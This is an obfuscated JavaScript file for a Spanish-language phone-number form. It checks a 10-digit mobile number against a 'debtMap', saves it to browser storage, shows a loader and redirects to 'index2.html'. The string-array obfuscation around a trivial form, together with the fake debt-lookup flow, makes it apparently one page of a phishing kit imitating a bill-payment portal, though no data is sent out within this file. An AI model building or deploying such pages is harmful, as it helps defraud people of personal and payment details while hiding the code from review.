const _0x150abf = _0x1f62;
(function (_0x353869, _0x44bb31) {
  const _0x2acad6 = _0x1f62,
    _0x5ce84f = _0x353869();
  while (!![]) {
    try {
      const _0x134c87 =
        (-parseInt(_0x2acad6(0x9b)) / 0x1) *
          (-parseInt(_0x2acad6(0xa2)) / 0x2) +
        (parseInt(_0x2acad6(0xb9)) / 0x3) * (-parseInt(_0x2acad6(0xa9)) / 0x4) +
        (-parseInt(_0x2acad6(0xbe)) / 0x5) *
          (-parseInt(_0x2acad6(0x9c)) / 0x6) +
        (-parseInt(_0x2acad6(0xb8)) / 0x7) *
          (-parseInt(_0x2acad6(0x9a)) / 0x8) +
        -parseInt(_0x2acad6(0xb4)) / 0x9 +
        parseInt(_0x2acad6(0xb0)) / 0xa +
        (-parseInt(_0x2acad6(0xb5)) / 0xb) * (parseInt(_0x2acad6(0xaa)) / 0xc);
      if (_0x134c87 === _0x44bb31) break;
      else _0x5ce84f["push"](_0x5ce84f["shift"]());
    } catch (_0x7ec980) {
      _0x5ce84f["push"](_0x5ce84f["shift"]());
    }
  }
})(_0x1426, 0x8521d);
function _0x1f62(_0x376944, _0x107118) {
  const _0x142676 = _0x1426();
  return (
    (_0x1f62 = function (_0x1f627b, _0x413aef) {
      _0x1f627b = _0x1f627b - 0x96;
      let _0x8d86c7 = _0x142676[_0x1f627b];
      return _0x8d86c7;
    }),
    _0x1f62(_0x376944, _0x107118)
  );
}
const celularInput = document[_0x150abf(0x98)](_0x150abf(0xa6));
function _0x1426() {
  const _0x47a7bc = [
    "metaInfo",
    "24AIZIpx",
    "90290BYYdLy",
    "1986198uEfRtU",
    "src",
    "href",
    "key",
    "value",
    "preventDefault",
    "10mHcXmi",
    "setItem",
    "style",
    "numeroCelular",
    "celular",
    "block",
    "stringify",
    "25948FVTwvl",
    "800628vCFdhn",
    "display",
    "location",
    "El\x20número\x20que\x20ingresaste\x20se\x20encuentra\x20al\x20día\x20en\x20pagos\x20sin\x20embargo\x20no\x20se\x20encontraron\x20deudas\x20pendientes",
    "length",
    "input",
    "6729570nPNKhc",
    "Por\x20favor\x20ingrese\x20un\x20número\x20de\x20celular\x20válido",
    "replace",
    "check",
    "4051701kmQuLT",
    "11sXhXvi",
    "info",
    "addEventListener",
    "868567FTlKsd",
    "354pUmVMi",
    "keydown",
    "index2.html",
    "Delete",
    "img/check.png",
    "5kCmQIa",
    "loader",
    "click",
    "getElementById",
  ];
  _0x1426 = function () {
    return _0x47a7bc;
  };
  return _0x1426();
}
celularInput[_0x150abf(0xb7)](_0x150abf(0xaf), function () {
  const _0xeb926f = _0x150abf;
  this["value"][_0xeb926f(0xae)] === 0x1 && this["value"] !== "3"
    ? (this["value"] = "")
    : (this[_0xeb926f(0xa0)] = this["value"][_0xeb926f(0xb2)](/[^0-9]/g, ""));
}),
  celularInput[_0x150abf(0xb7)](_0x150abf(0xba), function (_0x1a05ec) {
    const _0x54a2d3 = _0x150abf;
    this[_0x54a2d3(0xa0)]["length"] >= 0xa &&
      _0x1a05ec[_0x54a2d3(0x9f)] !== "Backspace" &&
      _0x1a05ec["key"] !== _0x54a2d3(0xbc) &&
      _0x1a05ec[_0x54a2d3(0xa1)]();
  });
function updateLS() {
  const _0x371f43 = _0x150abf;
  LS[_0x371f43(0xa3)](_0x371f43(0xb6), JSON[_0x371f43(0xa8)](info));
}
function cambiaimg(_0x9fdcb0) {
  const _0x4517f6 = _0x150abf;
  for (let _0x488b6f = 0x1; _0x488b6f <= 0x4; _0x488b6f++) {
    document[_0x4517f6(0x98)](_0x4517f6(0xb3) + _0x488b6f)[_0x4517f6(0x9d)] =
      "img/uncheck.png";
  }
  document[_0x4517f6(0x98)]("check" + _0x9fdcb0)[_0x4517f6(0x9d)] =
    _0x4517f6(0xbd);
}
function guardarNumero() {
  const _0x18e24e = _0x150abf;
  var _0x17168a = document["getElementById"](_0x18e24e(0xa6))["value"];
  if (_0x17168a["length"] < 0xa) {
    alert(_0x18e24e(0xb1));
    return;
  }
  _0x17168a in debtMap
    ? ((info[_0x18e24e(0x99)]["telnum"] = _0x17168a),
      updateLS(),
      localStorage[_0x18e24e(0xa3)](_0x18e24e(0xa5), _0x17168a),
      (document[_0x18e24e(0x98)](_0x18e24e(0x96))[_0x18e24e(0xa4)][
        _0x18e24e(0xab)
      ] = _0x18e24e(0xa7)),
      setTimeout(function () {
        const _0x8882a2 = _0x18e24e;
        window[_0x8882a2(0xac)][_0x8882a2(0x9e)] = _0x8882a2(0xbb);
      }, 0x3e8))
    : alert(_0x18e24e(0xad));
}
document[_0x150abf(0x98)]("boton")["addEventListener"](
  _0x150abf(0x97),
  function () {
    guardarNumero();
  }
);
